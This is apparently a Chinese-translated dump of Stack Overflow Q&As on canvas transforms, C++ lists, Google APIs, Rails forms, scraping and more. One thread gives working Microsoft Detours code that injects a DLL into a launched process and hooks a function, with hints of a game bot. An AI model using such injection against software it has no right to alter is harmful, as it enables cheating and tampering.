有人可以确认，这种方法有效并且您获得了不同的IP吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-26T09:43:29.163

我正在使用这个片段：[http ://snipplr.com/view/66992/use-a-random-user-agent-for-each-request/](http://snipplr.com/view/66992/use-a-random-user-agent-for-each-request/)

更新：修复了断开的链接

# c++ - 我如何在 C++ 中使用指向该元素的指针擦除元素表单列表

> ID：11603425
> 
> 赞同：0
> 
> 时间：2012-07-22T19:41:38.260
> 
> 标签：c++, list, element, erase

```
typedef struct  value 
{
    char* contents;
    int size;
}Value;

hash_map<Key,list<Value>,hash<Key>,eqKey> dspace;
hash_map<Key, list<Value>, hash<Key>, eqKey>::iterator itr;
list<Value> vallist;
list<Value>::iterator valitr;
Value * ptr;
itr=dspace.find(searchKey);
valitr=(itr->second).begin();
valitr++;
ptr=&*valitr; 
```

这里 ptr 指针指向 valitr 迭代器所指向的元素的地址。现在我想使用这个指针从列表中删除这个元素。我发现 list.erase 函数可以做到这一点，但我必须提供 position 或 iterator 。

请告诉我如何使用指针而不是遍历列表来擦除这个元素。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T20:35:19.393

列表的 API 不打算通过指针删除元素。你需要迭代器。

根据您使用的实现，可能有一些方法可以从指针中获取元素的插入器，但这并不能保证。而且以后可能会改变。

尝试以某种方式保留迭代器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T20:06:16.687

`valitr`表示列表中的位置。`*valitr`取消对迭代器的引用，为您提供对该指针的值数据的引用，该指针不再对存储它的列表有任何引用。

如果您确实需要删除列表中的某个元素，而不仅仅是去寻找第二个元素，您必须扫描列表（从`begin()`to `end()`，并检查查找元素的条件，并使用`erase`迭代器对该元素使用。

# javascript - 为什么没有办法在 canvas.getContext('2d').setTransform(a,b,c,d,e,f) 中旋转，什么是最好的旋转

> ID：11603426
> 
> 赞同：3
> 
> 时间：2012-07-22T19:41:44.880
> 
> 标签：javascript, html, canvas

我正在玩 HTML5 画布，我正在尝试实现一种使用平移、缩放和旋转在画布上移动图像的方法。

我已经使用 setTransform 进行了翻译和缩放：

```
canvas.getContext('2d').setTransform(a,b,c,d,e,f) 
```

这很方便，因为它丢弃了以前应用的变换，然后应用新的变换，因此在缩放等时不需要记住以前的状态。

[在 W3 学校](http://www.w3schools.com/html5/canvas_settransform.asp)中，第二个和第三个参数是*skewY*和*skewX*，我最初假设是旋转 x 和 y。然而，在应用将一些值传递给这些参数的变换之后，它似乎没有旋转 - 它使画布倾斜！（我知道很奇怪:-D）。

谁能告诉我为什么在集合变换中没有旋转（我很感兴趣，因为它看起来很奇怪，而且倾斜对我来说似乎毫无用处），以及围绕画布中心旋转的最佳方法是什么同时使用`setTransform`？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-22T22:40:16.270

setTransform is based on a 2D Matrix (3x3). These kinds of matrices are used for 2D/3D projections and are typically handled by game engines these days, rather than the programmers who make games.

These things are a little bit linear-algebra and a little bit calculus (for the rotation).

You're not going to like this a whole lot, but here's what you're looking at doing:

```
function degs_to_rads (degs) { return degs / (180/Math.PI); }
function rads_to_degs (rads) { return rads * (180/Math.PI); } 
```

Start with these helper functions, because while we think well in degrees, computers and math systems work out better in radians.

Then you want to start with calculating your rotation:

```
var rotation_degs = 45,
    rotation_rads = degs_to_rads(rotation_degs),

    angle_sine = Math.sin(rotation_rads),
    angle_cosine = Math.cos(rotation_rads); 
```

Then, based on the layout of the parameters:

```
ctx.setTransform(scaleX, skewY, skewX, scaleY, posX, posY); 
```

in the following order, when rearranged into a transform matrix:

```
//| scaleX, skewX,  posX |
//| skewY,  scaleY, posY |
//| 0,      0,      1    | 
```

...you'd want to submit the following values:

```
ctx.setTransform(angle_cosine, angle_sine, -angle_sine, angle_cosine, x, y);
// where x and y are now the "centre" of the rotation 
```

This should get you rotation clockwise.

The marginal-benefit being that you should then be able to multiply everything by the scale that you initially wanted (don't multiply the posX and posY, though).

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-09-21T08:36:24.723

我根据#Norguard 的回答做了一些测试。

以下是在画布上绘制精灵的整个过程，包括平移、缩放、旋转（在旋转中心）和 alpha（不透明度）：

```
var width = sprite.width;
var height = sprite.height;
var toX = sprite.transformOriginX * width;
var toY = sprite.transformOriginY * height;
// get the sin and cos value of rotate degree
var radian = sprite.rotate / 180 * Math.PI;
var sin = Math.sin(radian);
var cos = Math.cos(radian);

ctx.setTransform(
    cos * sprite.scaleX,
    sin * sprite.scaleX,
    -sin * sprite.scaleY,
    cos * sprite.scaleY,
    sprite.x + toX,
    sprite.y + toY
);
ctx.globalAlpha = sprite.alpha;
ctx.fillStyle = sprite.color;
ctx.fillRect(-toX, -toY, width, height); 
```

我做了一个互动展示，你可以玩：

```
// prepare the context
var myCanvas = document.getElementById('myCanvas');
var ctx = myCanvas.getContext('2d');

// say we have a sprite looks like this
var sprite = {
  x: 50,
  y: 50,
  width: 50,
  height: 100,
  transformOriginX: 0.5, // the center of sprite width
  transformOriginY: 0.5, // the center of sprite height
  scaleX: 1.5,
  scaleY: 1,
  rotate: 45,
  alpha: 0.5, // opacity
  color: 'red'
};

function drawSprite() {

  var width = sprite.width;
  var height = sprite.height;
  var scaleX = sprite.scaleX;
  var scaleY = sprite.scaleY;
  // get the transform-origin value
  var toX = sprite.transformOriginX * width;
  var toY = sprite.transformOriginY * height;
  // get the sin and cos value of rotate degree
  var radian = sprite.rotate / 180 * Math.PI;
  var sin = Math.sin(radian);
  var cos = Math.cos(radian);

  ctx.setTransform(
    cos * scaleX,
    sin * scaleX,
    -sin * scaleY,
    cos * scaleY,
    sprite.x + toX,
    sprite.y + toY
  );
  ctx.globalAlpha = sprite.alpha;
  ctx.fillStyle = sprite.color;
  ctx.fillRect(-toX, -toY, width, height);

  if (toShowInfo) {
    ctx.globalAlpha = 1;

    ctx.beginPath();
    ctx.moveTo(-toX + width / 2, -toY + height / 2);
    ctx.lineTo(-toX + width / 2, -toY);
    ctx.strokeStyle = 'lime';
    ctx.stroke();

    ctx.beginPath();
    ctx.moveTo(-toX + width / 2, -toY + height / 2);
    ctx.lineTo(-toX + width, -toY + height / 2);
    ctx.strokeStyle = 'yellow';
    ctx.stroke();
  }
}

function draw() { // main launcher
  // rest the ctx
  ctx.setTransform(1, 0, 0, 1, 0, 0);
  ctx.clearRect(0, 0, myCanvas.width, myCanvas.height);
  ctx.fillStyle = 'white';
  ctx.font = '12px Arial';
  ctx.textAlign = 'end';
  ctx.textBaseline = 'hanging';
  ctx.fillText('made by Rex Hsu', 395, 5);
  // draw sprite
  drawSprite();
  // draw info
  if (toShowInfo) { drawInfo(); };
}

function drawInfo() {

  var x = sprite.x;
  var y = sprite.y;
  var width = sprite.width;
  var height = sprite.height;
  var toX = sprite.transformOriginX * width;
  var toY = sprite.transformOriginY * height;

  ctx.setTransform(1, 0, 0, 1, 0, 0);
  ctx.globalAlpha = 1;
  ctx.beginPath();
  ctx.arc(x + toX, y + toY, 3, 0, Math.PI * 2);
  ctx.fillStyle = 'lime';
  ctx.fill();

  ctx.font = '12px Arial';
  ctx.textAlign = 'start';
  ctx.textBaseline = 'middle';
  ctx.fillText('center of rotation', x + toX + 10, y + toY + 0);

  ctx.beginPath();
  ctx.rect(x, y, width, height);
  ctx.strokeStyle = 'lime';
  ctx.stroke();
}

function modifySprite() {

  var name = this.id;
  var value = this.value;

  if (name !== 'color') {
    value *= 1;
  }

  sprite[name] = value;
  draw();
}

// init
var toShowInfo = true;

document.getElementById('checkbox').onchange = function() {

  toShowInfo = !toShowInfo;
  draw();
};

var propsDom = document.getElementById('props');

for (var i in sprite) {
  var div = document.createElement('div');
  var span = document.createElement('span');
  var input = document.createElement('input');

  span.textContent = i + ':';
  input.id = i;
  input.value = sprite[i];
  input.setAttribute('type', 'text');
  input.addEventListener('keyup', modifySprite.bind(input));

  div.appendChild(span);
  div.appendChild(input);
  propsDom.appendChild(div);
}

draw();
```

```
body {
  font-family: monospace;
}

canvas {
  float: left;
  background-color: black;
}

div {
  float: left;
  margin: 0 0 5px 5px;
}

div > div {
  float: initial;
}

span {
  font-size: 16px;
}

input[type="text"] {
  margin: 0 0 5px 5px;
  color: #999;
  border-width: 0 0 1px 0;
}
```

```
<canvas id="myCanvas" width="400" height="400"></canvas>
<div id="props" style="float: left; width: calc(100% - 400px - 5px);">
  <div style="float: initial;">
    <input type="checkbox" id="checkbox" checked><span>Show origin-shape and the center of rotation</span>
  </div>
</div>
```

# c++ - CreateProcessWithDLLEx-Hooked 进程启动但无法恢复

> ID：11603430
> 
> 赞同：0
> 
> 时间：2012-07-22T19:42:18.067
> 
> 标签：c++, windows, hook, detours, setwindowshookex

我试图使用微软的弯路来获得一个基本的钩子。我的程序能够成功运行 CreateProcessWithDllEx 并注入一个 dll。但是，我似乎无法恢复实际的挂钩程序。我正在使用记事本进行测试，我可以看到notepad.exe 在我的进程列表中运行，但记事本窗口实际上从未出现过。

我的dll如下：

```
#undef UNICODE
#include <cstdio>
#include <windows.h>
#include <detours.h>
#pragma comment(lib, "detours.lib")

typedef void (WINAPI *pFunc)(void);
DWORD WINAPI MyFunc(void);

pFunc FuncToDetour = (pFunc)DetourFindFunction("Winmm.dll", "timeGetTime"); //Set it at address to detour in 
//the process

extern "C" __declspec( dllexport )VOID NullExport( VOID )
{
}

INT APIENTRY DllMain(HMODULE hDLL, DWORD Reason, LPVOID Reserved)
{
  switch(Reason)
  {
    case DLL_PROCESS_ATTACH:
    {
        DisableThreadLibraryCalls(hDLL);
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        //DetourAttach(&(PVOID&)FuncToDetour, MyFunc);
        //DetourTransactionCommit();
    }
    break;
    case DLL_PROCESS_DETACH:
          DetourTransactionBegin();
          DetourUpdateThread(GetCurrentThread());
          DetourDetach(&(PVOID&)FuncToDetour, MyFunc);
          DetourTransactionCommit();
    break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH: 
    break;
  }
  return TRUE;
}
DWORD WINAPI MyFunc()
{
   return 0;
} 
```

而我的喷油器如下：

```
#undef _UNICODE
#include "stdafx.h"
#include <cstdio>
#include <windows.h>
#include <detours.h>

int main()
{
   STARTUPINFO si;
   PROCESS_INFORMATION pi;
   ZeroMemory(&si, sizeof(STARTUPINFO));
   ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
   si.cb = sizeof(STARTUPINFO);

   WCHAR DirPath[MAX_PATH+1];
   wcscpy_s(DirPath, MAX_PATH, L"C:\\Documents and Settings\\Administrator\\My Documents\\Visual Studio 2010\\Projects\\hbotinjector\\Release");

   char DLLPath[MAX_PATH+1] = "C:\\Documents and Settings\\Administrator\\My Documents\\Visual Studio 2010\\Projects\\hbotinjector\\Release\\hbotdll.dll";

   WCHAR EXE[MAX_PATH+1]={0};
   wcscpy_s( EXE, MAX_PATH, L"C:\\Documents and Settings\\Administrator\\My Documents\\Visual Studio 2010\\Projects\\hbotinjector\\Release\\notepad.exe" ); 

   STARTUPINFO _StartupInfo;
   PROCESS_INFORMATION _Information;
   ZeroMemory( &_Information, sizeof( PROCESS_INFORMATION ) );  

   if(DetourCreateProcessWithDllEx( EXE, NULL, NULL, NULL, TRUE, 
CREATE_DEFAULT_ERROR_MODE | CREATE_SUSPENDED, NULL, DirPath, &_StartupInfo, &_Information,
     DLLPath, NULL ))
     {
          MessageBoxA(NULL,"INJECTED", NULL, NULL);
          ResumeThread(_Information.hThread);
          WaitForSingleObject(_Information.hProcess, INFINITE);
     }
     else
     {
          char error[100];
          sprintf(error, "%d", GetLastError());
          MessageBoxA(NULL, error, NULL, NULL);
     }

     return 0;
 } 
```

我用 .def 文件构建了我的 dll，确保在序号 1 处有所需的函数，以便绕道正常工作：

```
LIBRARY HBOTDLL
EXPORTS

NullExport @1 
```

有谁知道是什么导致进程无法运行？附带说明一下，我也尝试过使用空白 dll，它只包含序号 1 处所需的函数，没有其他内容，它似乎具有相同的结果。

此外，只要 notepad.exe 进程显示在进程列表中，我的注入器就会永远运行。这是对 WaitForSingleObject 的响应，这似乎表明进程已正确生成。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T20:21:07.110

根据 Hans Passant 的评论，我回过头来发现我已经声明了 pi 和 si 以及 _Information 和 _StartupInfo。我没有将我创建的第二组归零，那是我正在使用的组。所以我改变了对 CreateProcessWithDllEx 的调用以使用 &pi 和 &si。现在一切正常。

# google-maps - 带有透明文本标签的谷歌地图标记

> ID：11603431
> 
> 赞同：0
> 
> 时间：2012-07-22T19:42:41.927
> 
> 标签：google-maps, google-maps-api-3, google-maps-markers

如何使用透明文本标签在谷歌地图上放置标记？

示例：带有天气叠加层的 Google 地图具有透明背景的温度。
标记的标签会动态变化。例如，随着温度的变化，标签也会发生变化。

![已选择天气选项的 Google 地图](../Images/d8bb30371d8ce00f5652bcb5d4edc639.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T20:26:19.050

试试[MarkerWithLabel](http://google-maps-utility-library-v3.googlecode.com/svn/tags/markerwithlabel/1.1.5/)实用程序库。这是[**一个演示**](http://jsfiddle.net/yV6xv/181/)

最低要求是 CSS 样式。

```
.labels {
  color: red;
  background-color: transparent;
  font-family: "Lucida Grande", "Arial", sans-serif;
  font-size: 10px;
  font-weight: bold;
  text-align: center;
  width: 100px;
  border: 0;
} 
```

​</p>

```
 var marker1 = new MarkerWithLabel({
    position: new google.maps.LatLng(0,-5),
    draggable: true,
    raiseOnDrag: true,
    map: map,
    labelContent: "Tina's transparent Marker With Label",
    labelAnchor: new google.maps.Point(50, 0),
    labelClass: "labels", // the CSS class for the label
    labelStyle: {opacity: 0.75}
  }); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2018-09-24T14:38:19.170

如果您只需要更改标签不透明度，请不要使用库。

您可以使用：

```
let marker = new google.maps.Marker({
    position: myLatLng,
    map: map,
    label: {
        text: 'Hello World!',
        color: 'rgba(0, 0, 0, 0.5)',
    }
}) 
```

# javascript - 如何使用 v3 API 和 JQuery 将事件添加到 Google 日历？

> ID：11603434
> 
> 赞同：1
> 
> 时间：2012-07-22T19:43:25.293
> 
> 标签：javascript, jquery, google-calendar-api

我试图通过组合一个执行以下操作的简单页面来自学一些 JQuery/REST/Google API：

1.  通过 Google 进行身份验证
2.  验证令牌
3.  获取用户的 Google 日历列表
4.  列出选定日历的事件
5.  为选定的日历添加事件

我有 #1 到 #4 工作（尽管毫无疑问以丑陋的方式），并且在 #5 上被绊倒了。这是 JQuery ajax 调用：

```
var url = 'https://www.googleapis.com/calendar/v3/calendars/[MY_CALENDAR_ID]/events?sendNotifications=false&access_token=[GOOGLE_API_TOKEN]';
            var data = { end: { dateTime: "2012-07-22T11:30:00-07:00" }
                            , start: { dateTime: "2012-07-22T11:00:00-07:00" }
                            , summary: "New Calendar Event from API"
                        };

            var ajax = $.ajax({ url: url
                                , data: data
                                , type: 'POST'
                        }).done(addEventDone)
                          .fail(function (jqHXR, textStatus) {
                              console.log("addEvent(): ajax failed = " + jqHXR.responseText);
                              console.log(jqHXR);
                          }); 
```

结果是全局 parseError：“此 API 不支持解析表单编码输入。”。前四个步骤都使用 GET ajax 调用，所以我不确定这是否是让我绊倒的原因。

这是有问题的 API：[https ://developers.google.com/google-apps/calendar/v3/reference/events/insert](https://developers.google.com/google-apps/calendar/v3/reference/events/insert)

我想我可能正在做一些漫长而艰难的事情，我的新方法是使用 javascript API 来解决这个问题，而不是直接使用手动 JQuery 和 REST 来解决这个问题。这是我正在尝试前进的方法[http://code.google.com/p/google-api-javascript-client/wiki/Samples#Calendar_API](http://code.google.com/p/google-api-javascript-client/wiki/Samples#Calendar_API)，尽管如果有的话我仍然希望将其用作学习机会一些简单的事情我在上面的代码中搞砸了。

感谢您提供任何帮助、见解、指针等。如果我使用 javascript API 取得任何进展，我将发布更新。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-24T00:33:34.613

[有趣的是，我刚刚在这里](https://stackoverflow.com/questions/11607465/need-good-example-google-calendar-api-in-javascript/11622475#11622475)回答了一个类似的问题。您对使用 Google 的 JS 客户端库的直觉很好。它将为您处理 OAuth 2，如果您要对日历数据进行任何操作，这是一个要求。

我的另一个答案既有指向我撰写的[博客文章](http://googleappsdeveloper.blogspot.com/2011/12/using-new-js-library-to-unlock-power-of.html)的链接（演示了客户端和用户授权的配置），也有插入日历事件的示例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-07-19T06:39:19.083

你需要设置 contentType: "application/json"，为你的数据和方法做 JSON.stringify：'POST'

```
var ajax = $.ajax({
url: url,
contentType: "application/json",
data: JSON.stringify(data),
method : 'POST',
}); 
```

# javascript - JavaScript onLoad 调整大小

> ID：11603440
> 
> 赞同：0
> 
> 时间：2012-07-22T19:44:29.867
> 
> 标签：javascript, resize, onload

我对编程很陌生，尤其是 javascript。我已经创建了一个我认为是刷新浏览器并循环浏览一系列图像的网络艺术项目。我希望浏览器窗口自动调整为图像尺寸，612x612 像素。我已经尝试了我能想到的所有东西，我在网络上遇到的所有东西，但我为刷新和图像加载设置的代码似乎没有任何效果。我需要帮助。

让我说，我通常反对这种未指定的浏览器大小调整或任何不允许用户自己做出决定的侵入性脚本。但这是一个艺术项目，仅作为我自己网站上画廊的一部分存在，用户将在点击链接之前提前收到警告，他们的浏览器将调整大小。

我想要的是让浏览器在页面加载时调整到指定的尺寸，然后通过自动刷新循环浏览图像。

因此，请任何愿意为此提供帮助的人都将非常感激。我想我已经走得很远了，这个调整大小是这个难题的最后一点。先感谢您。

您可以在这里看到没有调整大小的粗略项目：http: [//jasonirla.com/bgchange%202/](http://jasonirla.com/bgchange%202/)

和我正在使用的代码：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"     "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
<html xmlns="http://www.w3.org/1999/xhtml"> 
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> 
<meta name="title" content="Background Change" /> 
<meta name="description" content="Background Change" /> 

<title>Everyday Sky</title> 

<script type="text/javascript">

// auto refresh window PT 1
function timedRefresh(timeoutPeriod) {
    setTimeout("location.reload(true);",timeoutPeriod);
}
// no. of images in folder is 43
var totalCount = 43;
// change image on refresh 
function ChangeIt() {
var num =  Math.ceil( Math.random() * totalCount );
document.body.background = 'images/'+num+'.jpeg';
}
</script> 

</head>
<!-- Refresh PT 2 with timer in seconds 5000=5seconds-->
<body onload="JavaScript:timedRefresh(100);">

<script type="text/javascript"> 
ChangeIt();
</script> 
<style type="text/css">

body {
background-repeat: no-repeat;

}

</body> 
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T19:55:52.937

确实，您只能通过使用 JavaScript 创建新窗口来设置浏览器窗口的大小，但许多安全设置会阻止弹出窗口。我认为无论如何做你正在尝试的事情都是糟糕的 UI 设计。如果您真的想要一些现代且功能强大的东西，Lightbox（如上所述）是一个很棒的工具，以及[jQuery UI 中的对话框。](http://jqueryui.com/demos/dialog/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T20:37:59.660

由于这是一个展览，您将选择使用什么浏览器，但大多数新浏览器不再让 JavaScript 调整它们的大小。不过值得一试。

```
 <body onload="JavaScript:timedRefresh(100);resizeTo(500,500);self.moveTo(640,10);>
 ....
 </body> 
```

干杯。

# tcp - IP 分片和 TCP ACK

> ID：11603441
> 
> 赞同：4
> 
> 时间：2012-07-22T19:44:46.260
> 
> 标签：tcp, ip, network-protocols, fragmentation

我对原始数据包分段时 TCP_ACK 的工作方式有疑问。

例如，原始数据包大小为 1,500*N 字节，MTU 为 1,500。然后，数据包将被分成（大约）N个数据包。在这种情况下，接收方如何向发送方发送 TCP_ACK？我检查了wireshark，似乎接收器为每两个碎片数据包发送TCP_ACK。这样对吗？

你能给我一些参考或解释吗？谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-24T01:09:30.187

在将数据包交给 TCP 之前，接收器堆栈上的 IP 层将所有**IP 片段**重新组合成单​​个**TCP 段。**在正常情况下，TCP 应该只为整个 TCP 段发送一个 ACK​​。ACK # 将像往常一样是下一个预期的 SEQ #。

# apache-flex - Adobe Flex Mobile 4.6 DateSpinner 月份名称

> ID：11603443
> 
> 赞同：0
> 
> 时间：2012-07-22T19:44:54.737
> 
> 标签：apache-flex, mobile, adobe

正如主题所说，我使用 Adob​​e Flex Mobile 4.6。现在我正在使用 Spark 组件 DateSpinner，我想用其他语言设置月份名称，而不是英语。有什么建议么？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:10:51.333

作为一个简单的解决方案，您可以通过将 CSS 中的“locale”属性设置为所需的语言代码来做到这一点，它会生成所需语言的月份名称。

如果所需的语言代码不存在，您可以创建一个类似于 SDK_directory\frameworks\projects\framework\bundles\en_US\SharedResources.properties 的代码，这是定义月份名称的地方。

# mongodb - 将数据持久化为 MongoDB 中的（无序）集合

> ID：11603447
> 
> 赞同：1
> 
> 时间：2012-07-22T19:45:01.137
> 
> 标签：mongodb

我正在将 MongoDB 与 node.js 一起使用。是否可以直接将数据作为（无序）集合保存在 MongoDB 中？或者我必须要么

*   将它们保存为数组并将其转换为 JavaScript 中的集合

或者

*   以以下形式将它们作为对象持久保存`{entry1: true, entry2: true, ...}`

如果我必须以上述两种方式中的任何一种方式进行，哪一种更有效？考虑到我需要经常添加/删除项目，但很少需要重新分配整个集合/数组。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T00:26:18.827

您可以在 MongoDB 中将数组作为集合进行操作...相关运算符包括：

*   [$addToSet](http://docs.mongodb.org/manual/reference/operators/#_S_addToSet) - 只有当值不在数组中时，$addToSet 运算符才将值添加到数组中。

*   [$push](http://docs.mongodb.org/manual/reference/operators/#_S_push) - $push 运算符将指定的值附加到数组。

*   [$pop](http://docs.mongodb.org/manual/reference/operators/#_S_pop) - $pop 运算符删除数组的第一个或最后一个元素。

*   [$pull](http://docs.mongodb.org/manual/reference/operators/#_S_pull) - $pull 运算符从现有数组中删除值的所有实例。

*   [$elemMatch](http://docs.mongodb.org/manual/reference/operators/#_S_elemMatch) - $elemMatch 运算符匹配数组元素中的多个组件。

# python - Python Web Scraping - 导航到 Next_Page 链接并获取数据

> ID：11603448
> 
> 赞同：0
> 
> 时间：2012-07-22T19:45:02.697
> 
> 标签：python, web-scraping, beautifulsoup

我正在使用 Python 和 Beautiful Soup 从[Civic Commons - Social Media](http://civiccommons.org/software-functions/social-media)链接获取可用软件的 url。我想要所有社交媒体软件的链接（分布在 20 页）。我能够获得第一页中列出的软件的 url。

下面是我为获取这些值而编写的 Python 代码。

```
from bs4 import BeautifulSoup
import re
import urllib2

base_url = "http://civiccommons.org"
url = "http://civiccommons.org/software-functions/social-media"
page = urllib2.urlopen(url)
soup = BeautifulSoup(page.read())

list_of_links = [] 
for link_tag in soup.findAll('a', href=re.compile('^/apps/.*')):
   string_temp_link = base_url+link_tag.get('href')
   list_of_links.append(string_temp_link)

list_of_links = list(set(list_of_links))  

for link_item in list_of_links:
   print link_item

print ("\n")

#Newly added code to get all Next Page links from a url    
next_page_links = [] 
for link_tag in soup.findAll('a', href=re.compile('^/.*page=')):
   string_temp_link = base_url+link_tag.get('href')
   next_page_links.append(string_temp_link)
for next_page in next_page_links:
   print next_page 
```

我使用 /apps/ 正则表达式来获取软件列表。

但我想知道是否有更好的方法来爬取下一页。我可以使用正则表达式“*page=”来匹配下一页链接。但这给出了重复的页面列表。

我怎样才能以更好的方式做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T19:54:31.527

查看页面，有 5 页，最后一个是“...？page=4”，所以，我们知道有第一页，然后 page=1 到 page=4...

```
<li class="pager-last last">
<a href="/software-licenses/gpl?page=4" title="Go to last page">last »</a>
</li> 
```

所以你可以通过类（或标题）检索它，然后解析href ...

```
from urlparse import urlparse, parse_qs
for pageno in xrange(1, int(parse_qs(urlparse(url).query)['page'][0]) + 1):
    pass # do something useful here like building a url string with pageno 
```

# ruby-on-rails - Rails 多态/单表继承模型，在表单中选择类型

> ID：11603450
> 
> 赞同：1
> 
> 时间：2012-07-22T19:45:19.787
> 
> 标签：ruby-on-rails, forms, activerecord, polymorphism, single-table-inheritance

**更新：**在考虑了更多之后，我认为这个问题包括多态性和 STI。

假设我有以下内容：

```
class Vehicle < ActiveRecord::Base
  belongs_to :dealership
  ...
end

class Car < Vehicle
  ...
end

class Truck < Vehicle
  ...
end 
```

Car 和 Truck 模型具有相同的属性，但模型中的逻辑不同，因此它们都只使用 Vehicles 表。

我想制作一个通用表格，允许某人创建新的车辆记录，并选择它是“汽车”还是“卡车”。然后，此表单应在后端创建“汽车”或“卡车”记录，而不是通用的“车辆”记录。

**问题：** 您如何在 Rails 表单中显示此选项？具体来说，是否有列出抽象基础模型的子类型的方法，和/或是否有一种简单的方法可以将它们呈现为（例如）表单中的 Select 元素？

我希望创建一个可以制造汽车或卡车的表格，而不是只为汽车和卡车提供两种不同的表格的原因，最终我还希望这些模型嵌套在父级“经销商”中。我不仅希望能够创建新车辆并选择“汽车”或“卡车”作为选项，还希望能够拥有嵌套表单，用户可以在其中加载“经销商”并查看/编辑所有汽车以及以单一形式属于该经销商的卡车。我知道如何使用`accepts_nested_attributes_for`一个简单的关联`Vehicle belongs_to :dealership`来设置它，但我不确定如何为从 Vehicle 继承的子模型设置它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-05-07T21:27:38.473

我有同样的问题。基本上，您正在尝试构建一个接受`has_many`基类关联的表单，但您想为任何 Decorated / Concrete 类动态创建单独的表单（添加嵌套字段）。

我使用`cocoon`gem 解决了这个问题，它提供了向表单动态添加正确字段的方法。`_form`部分看起来像：

```
# _form.html.haml

= simple_form_for @dealership, :html => { :multipart => true } do |f|

  = f.simple_fields_for :vehicles do |vehicle|
    = render 'vehicle_fields', :f => vehicle
    = link_to_add_association 'Add a Car', f, :vehicles, :wrap_object => Proc.new { |vehicle| vehicle = Car.new }
    = link_to_add_association 'Add a Truck', f, :vehicles, :wrap_object => Proc.new { |vehicle| vehicle = Truck.new }

= f.button :submit, :disable_with => 'Please wait ...', :class => "btn btn-primary", :value => 'Save' 
```

然后`_vehicle_fields`

```
# _vehicle_fields.html.haml

- if f.object.type == 'Car'
  = render 'car_fields', :f => f
- elsif f.object.type == 'Truck'
  = render 'truck_fields', :f => f 
```

`car_fields`并且`truck_fields`还会提供一个`link_to_remove_association`链接`cocoon`

查看[https://github.com/nathanvda/cocoon](https://github.com/nathanvda/cocoon)`:wrap_object`上的文档，或阅读我的博客文章[http://www.powpark.com/blog/programming/2014/05/07/rails_nested_forms_for_single_table_inheritance_associations](http://www.powpark.com/blog/programming/2014/05/07/rails_nested_forms_for_single_table_inheritance_associations)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T20:12:59.977

我可能是错的，但我理解`polymorphic`相反。我的意思是，一个模型可以属于多个其他模型...

`Car`并且`Truck`是一种`Vehicle`。因此，可以说`Vehicle`具有`year`和`mark`属性。

您可以创建一个新的`Car`or `Truck`，并且定义了多态，您将像往常一样创建您的表单。

```
@car = Car.find(id)
@vehicle = @car.vehicles.build(year: "1999", mark: "Beetle") 
@vehicle.save 
```

我希望它有帮助...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-22T20:25:02.293

我不认为表单上的简单选择元素可以解决您的问题。您在这里尝试实现的目标被称为`Multiple Table Inheritance`，您的问题应该是您必须构建模型以便轻松反映在数据库中的方式。因为这是一个很长的讨论，所以我将向您指出[这篇文章](http://techspry.com/ruby_and_rails/multiple-table-inheritance-in-rails-3/)，我在其中解释了执行此操作的最佳方式。我希望我在某种程度上帮助了你:)

PS：要回答您的问题，Rails 框架中没有内置机制来做这种事情。

# jquery - 防止选择下拉菜单在 FireFox 和 Opera 中打开

> ID：11603453
> 
> 赞同：3
> 
> 时间：2012-07-22T19:46:15.707
> 
> 标签：jquery, html, firefox, opera, html-select

在 jQuery 中，您可以`<select>`通过在 mousedown 处理程序中使用 event.preventDefault 来阻止 a 打开它的下拉菜单。允许您将下拉列表替换为其他内容，同时仍保留表单元素的原始样式。

这在 Chrome 和 MSIE 中运行良好，但在 FireFox 和 Opera 中无论如何都会出现下拉菜单。（未在 Safari 上测试）

示例：http: [//jsfiddle.net/9cmEh/](http://jsfiddle.net/9cmEh/)

选择元素应该看起来是启用的，并且仍然像启用一样响应所有用户交互，但不应该呈现下拉菜单。相反，下拉菜单将替换为自定义渲染的内容，例如包括颜色样本、图标或字体，但“自定义下拉菜单”部分已经在我的项目中完成。

有谁知道如何在所有*浏览器中进行这项工作。

*   “全部”表示上述五种浏览器的最新版本。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-07-22T20:14:20.630

```
$(function() {
    $('select').on('focus', function(e) {
        this.blur();
        window.focus();
    });
}); 
```

[小提琴](http://jsfiddle.net/9cmEh/5/)

至少可以在 Firefox 中使用，但在 Chrome 中似乎不起作用？

**编辑**

我无法想出一种体面的方法来检测一种方法是否有效，因此进行了一些浏览器嗅探。不是最好的方法，但我能想到的最好的方法，它似乎在我测试过的浏览器中工作：

```
$(function() {
    $('select').on('focus mousedown', function(e) {
        if ($.browser.webkit||$.browser.msie) {
            e.preventDefault();
        }else{
            this.blur();
            window.focus();
        }
    });
});​ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T20:11:56.030

你这个

```
 //e.stopPropagation works only in Firefox.
                  if (event.stopPropagation) {
                event.stopPropagation();
                event.preventDefault();
                 } 
```

